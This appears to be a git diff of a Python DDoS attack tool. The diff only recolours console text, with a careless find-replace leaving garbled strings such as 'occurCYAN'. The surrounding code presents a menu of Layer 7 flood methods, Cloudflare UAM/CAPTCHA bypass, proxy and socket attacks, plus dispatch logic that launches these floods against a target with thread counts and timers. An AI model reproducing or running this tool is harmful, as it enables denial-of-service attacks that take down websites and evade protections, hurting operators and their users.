+            print('An error has occurCYAN while sending the request to the API!')
     else:
-        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
+        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"Unknown command. type 'help' to see all commands.\n")  
 ##############################################################################################   
 
 def func():
-    stdout.write(Fore.MAGENTA+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.MAGENTA+"]\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.MAGENTA+": "+Fore.WHITE+"Bypass CF attack\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.MAGENTA+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.MAGENTA+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.MAGENTA+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
-#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.MAGENTA+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
-#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.MAGENTA+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.MAGENTA+": "+Fore.WHITE+"Request attack\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.MAGENTA+": "+Fore.WHITE+"Post Request attack\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.MAGENTA+": "+Fore.WHITE+"Head Request attack\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.MAGENTA+": "+Fore.WHITE+"Socket attack\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.MAGENTA+": "+Fore.WHITE+"Proxy Request attack\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.MAGENTA+": "+Fore.WHITE+"Proxy Socket attack\n")
+    stdout.write(Fore.CYAN+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.CYAN+"]\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"cfb        "+Fore.CYAN+": "+Fore.RED+"Bypass CF attack\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"pxcfb      "+Fore.CYAN+": "+Fore.RED+"Bypass CF attack with proxy\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"cfpro      "+Fore.CYAN+": "+Fore.RED+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"cfsoc      "+Fore.CYAN+": "+Fore.RED+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
+#    stdout.write(Fore.CYAN+" • "+Fore.RED+"sky        "+Fore.CYAN+": "+Fore.RED+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
+#    stdout.write(Fore.CYAN+" • "+Fore.RED+"stellar    "+Fore.CYAN+": "+Fore.RED+"HTTPS Sky method without proxies\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"raw        "+Fore.CYAN+": "+Fore.RED+"Request attack\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"post       "+Fore.CYAN+": "+Fore.RED+"Post Request attack\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"head       "+Fore.CYAN+": "+Fore.RED+"Head Request attack\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"soc        "+Fore.CYAN+": "+Fore.RED+"Socket attack\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"pxraw      "+Fore.CYAN+": "+Fore.RED+"Proxy Request attack\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"pxsoc      "+Fore.CYAN+": "+Fore.RED+"Proxy Socket attack\n")
     
-    #stdout.write(Fore.MAGENTA+" \n["+Fore.WHITE+"LAYER 4"+Fore.MAGENTA+"]\n")
-    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.MAGENTA+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
-    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.MAGENTA+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
+    #stdout.write(Fore.CYAN+" \n["+Fore.RED+"LAYER 4"+Fore.CYAN+"]\n")
+    #stdout.write(Fore.CYAN+" • "+Fore.RED+"tcp        "+Fore.CYAN+": "+Fore.RED+"Strong TCP attack (not supported)\n")
+    #stdout.write(Fore.CYAN+" • "+Fore.RED+"udp        "+Fore.CYAN+": "+Fore.RED+"Strong UDP attack (not supported)\n")
 
-    stdout.write(Fore.MAGENTA+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.MAGENTA+"]\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.MAGENTA+": "+Fore.WHITE+"Classic DNS Lookup\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.MAGENTA+": "+Fore.WHITE+"Geo IP Address Lookup\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.MAGENTA+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
+    stdout.write(Fore.CYAN+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.CYAN+"]\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"dns        "+Fore.CYAN+": "+Fore.RED+"Classic DNS Lookup\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"geoip      "+Fore.CYAN+": "+Fore.RED+"Geo IP Address Lookup\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"subnet     "+Fore.CYAN+": "+Fore.RED+"Subnet IP Address Lookup\n")
     
-    stdout.write(Fore.MAGENTA+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.MAGENTA+"]\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.MAGENTA+": "+Fore.WHITE+"Clear console\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.MAGENTA+": "+Fore.WHITE+"Bye..\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cMAGENTAit     "+Fore.MAGENTA+": "+Fore.WHITE+"Thanks for\n")
+    stdout.write(Fore.CYAN+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.CYAN+"]\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"clear/cls  "+Fore.CYAN+": "+Fore.RED+"Clear console\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"exit       "+Fore.CYAN+": "+Fore.RED+"Bye..\n")
+    stdout.write(Fore.CYAN+" • "+Fore.RED+"cCYANit     "+Fore.CYAN+": "+Fore.RED+"Thanks for\n")
 
 if __name__ == '__main__':
     init(convert=True)
@@ -1170,23 +1170,23 @@ if __name__ == '__main__':
             LaunchPXSOC(target, thread, t)
             timer.join()
     elif method == "cfreq":
-        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchCFPRO(target, thread, t)
             timer.join()
         else:
-            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
     elif method == "cfsoc":
-        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchCFSOC(target, thread, t)
             timer.join()
         else:
-            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
     elif method == "http2":
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
@@ -1215,3 +1215,4 @@ if __name__ == '__main__':
         timer.join()
     else:
         stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
+
